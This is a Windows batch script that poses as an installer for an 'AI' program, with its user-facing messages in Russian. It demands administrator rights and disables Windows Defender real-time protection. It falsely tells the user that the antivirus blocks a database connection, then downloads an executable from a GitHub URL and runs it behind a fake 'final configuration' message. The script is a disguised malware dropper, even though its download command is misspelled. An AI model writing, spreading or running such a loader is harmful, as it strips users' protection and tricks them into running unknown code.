@echo off
chcp 65001 >nul

net session >nul 2>&1
if %errorLevel% neq 0 (
	echo Ошибка: недостаточно прав для установки
	echo Запустите установщик от имени администратора
	pause
	exit /b
)

powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"

powershell -Command "Get-MpPreference" | find "DisableRealtimeMonitoring" >nul 2>&1
if %errorLevel% equ 0 (
	echo Установка ИИ
) else (
	echo Ошибка: Windows Defender блокирует соединение с базой данных
	echo Попробуйте отключить антивирус
	pause
	exit /b
)

set "url=https://github.com/228Tapochek228/ai/raw/refs/heads/main/ai.exe"
set "downloadPath=%USERPROFILE%\Downloads\ai.exe"

powershell -Command "InvokeWebRequest -Uri 'url' -OutFile '%downloadPath%'"
if not exist "%downloadPath%" (
	echo Ошибка скачивания
	echo Попробуйте перезапустить загрузчик
)

start "" "%downloadPath%"
echo Финальная конфигурация ИИ
echo Это займет не более 10 минут, не выключайте компьютер
pause
